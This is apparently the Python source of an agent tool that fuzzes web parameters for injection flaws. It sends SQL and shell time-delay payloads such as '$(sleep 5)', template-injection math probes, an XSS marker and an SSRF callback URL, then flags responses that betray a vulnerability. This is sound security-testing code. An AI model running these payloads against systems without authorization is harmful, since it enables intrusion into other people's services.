"""Taint each parameter with injection payloads and detect via robust oracles.

One tool instead of hand-driving sqlmap per param. For every named parameter it
injects SQLi/command time-delays (measure latency vs a baseline), SSTI with
unique math (look for the product in the body, not just reflection), an XSS
marker (raw reflection), and — if given an OAST domain — an SSRF callback URL
(confirm later with oast_poll). Deterministic oracles, low false positives.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


_SLEEP_SECONDS = 5
_DELAY_THRESHOLD_MS = 4000
_SSTI_MATH = "1337*1337"
_SSTI_PRODUCT = "1787569"
_XSS_MARKER = "strixj9<svg/onload=1>"

_TIME_PAYLOADS = (
    ("sql_time", f"1' AND SLEEP({_SLEEP_SECONDS})-- -"),
    ("sql_time", f"1) OR pg_sleep({_SLEEP_SECONDS})-- -"),
    ("cmd_time", f"; sleep {_SLEEP_SECONDS}"),
    ("cmd_time", f"$(sleep {_SLEEP_SECONDS})"),
)
_SSTI_PAYLOADS = (f"{{{{{_SSTI_MATH}}}}}", f"${{{_SSTI_MATH}}}", f"#{{{_SSTI_MATH}}}")


def _with_query_param(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[name] = [value]
    new_query = urlencode({k: v[0] for k, v in query.items()})
    return urlunparse(parsed._replace(query=new_query))


def _inject(
    method: str,
    url: str,
    name: str,
    value: str,
    headers: dict[str, str] | None,
    body: str | None,
    point: str,
    timeout: int,
) -> dict[str, Any]:
    if point == "body" and body is not None:
        try:
            payload = json.loads(body)
        except (json.JSONDecodeError, ValueError):
            payload = {}
        if isinstance(payload, dict):
            payload[name] = value
        return _replay_impl(
            method, url, headers, json.dumps(payload), timeout, allow_redirects=False
        )
    return _replay_impl(
        method, _with_query_param(url, name, value), headers, body, timeout, allow_redirects=False
    )


def _fuzz_param(
    method: str,
    url: str,
    name: str,
    headers: dict[str, str] | None,
    body: str | None,
    point: str,
    oast_domain: str | None,
    timeout: int,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    baseline = _inject(method, url, name, "strixbaseline1", headers, body, point, timeout)
    base_ms = baseline.get("elapsed_ms") or 0
    base_body = baseline.get("body") or ""

    for family, payload in _TIME_PAYLOADS:
        resp = _inject(
            method, url, name, payload, headers, body, point, max(timeout, _SLEEP_SECONDS + 5)
        )
        if not resp.get("success"):
            continue
        delay = (resp.get("elapsed_ms") or 0) - base_ms
        if delay >= _DELAY_THRESHOLD_MS:
            findings.append(
                {
                    "param": name,
                    "family": family,
                    "payload": payload,
                    "severity": "critical",
                    "evidence": f"response delayed {round(delay)}ms vs baseline ({family})",
                }
            )

    for payload in _SSTI_PAYLOADS:
        resp = _inject(method, url, name, payload, headers, body, point, timeout)
        body_text = resp.get("body") or ""
        if resp.get("success") and _SSTI_PRODUCT in body_text and _SSTI_PRODUCT not in base_body:
            findings.append(
                {
                    "param": name,
                    "family": "ssti",
                    "payload": payload,
                    "severity": "critical",
                    "evidence": f"template evaluated {_SSTI_MATH} to {_SSTI_PRODUCT}",
                }
            )
            break

    xss = _inject(method, url, name, _XSS_MARKER, headers, body, point, timeout)
    if xss.get("success") and _XSS_MARKER in (xss.get("body") or ""):
        findings.append(
            {
                "param": name,
                "family": "xss",
                "payload": _XSS_MARKER,
                "severity": "high",
                "evidence": "marker reflected unescaped — confirm JS exec in a browser",
            }
        )

    if oast_domain:
        callback = f"http://{oast_domain}/{name}"
        _inject(method, url, name, callback, headers, body, point, timeout)
        findings.append(
            {
                "param": name,
                "family": "ssrf",
                "payload": callback,
                "severity": "unconfirmed",
                "evidence": f"SSRF payload sent — call oast_poll; a hit on /{name} confirms it",
            }
        )
    return findings


def _injection_fuzz_impl(
    method: str,
    url: str,
    params: list[str],
    headers: dict[str, str] | None,
    body: str | None,
    injection_point: str,
    oast_domain: str | None,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    if not params:
        return {"success": False, "error": "params cannot be empty (names to fuzz)"}
    point = "body" if injection_point == "body" else "query"
    findings: list[dict[str, Any]] = []
    for name in params[:15]:
        findings.extend(_fuzz_param(method, url, name, headers, body, point, oast_domain, timeout))
    confirmed = [f for f in findings if f["severity"] != "unconfirmed"]
    return {
        "success": True,
        "url": url,
        "params_fuzzed": len(params[:15]),
        "finding_count": len(confirmed),
        "possible_injection": bool(confirmed),
        "findings": findings,
    }


@function_tool(timeout=600, strict_mode=False)
async def injection_fuzz(
    ctx: RunContextWrapper,
    url: str,
    params: list[str],
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    injection_point: str = "query",
    oast_domain: str | None = None,
    timeout: int = 12,
) -> str:
    """Fuzz each named parameter for SQLi/SSTI/command/XSS/SSRF injection.

    For each param: a fast baseline, then time-delay payloads (SQL/command —
    flagged when the response is >4s slower than baseline), SSTI with unique math
    (flagged when the product appears in the body), an XSS marker (raw
    reflection), and — if ``oast_domain`` is set — an SSRF callback URL (confirm
    with ``oast_poll``). Get param names from ``endpoint_risk_rank`` / your crawl.
    Only test authorized targets.

    Returns JSON with ``possible_injection``, ``finding_count``, and per-finding
    ``param`` / ``family`` / ``payload`` / ``severity`` / ``evidence``.

    Args:
        url: Target URL (with the params in the query string, or the body).
        params: Parameter names to fuzz (max 15).
        method: HTTP method (default GET).
        headers: Request headers (e.g. auth).
        body: Raw JSON body when ``injection_point='body'``.
        injection_point: ``query`` (default) or ``body``.
        oast_domain: An ``oast_get_domain`` host to test blind SSRF.
        timeout: Base per-request timeout in seconds (default 12).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _injection_fuzz_impl,
            method,
            url,
            params,
            headers,
            body,
            injection_point,
            oast_domain,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )
